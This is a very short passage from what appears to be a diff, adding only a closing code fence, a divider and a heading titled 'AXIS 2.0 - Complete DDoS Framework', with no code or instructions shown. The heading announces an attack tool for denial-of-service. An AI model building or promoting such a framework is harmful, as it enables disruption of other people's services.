+```
+
+---
+
+**AXIS 2.0 - Complete DDoS Framework**
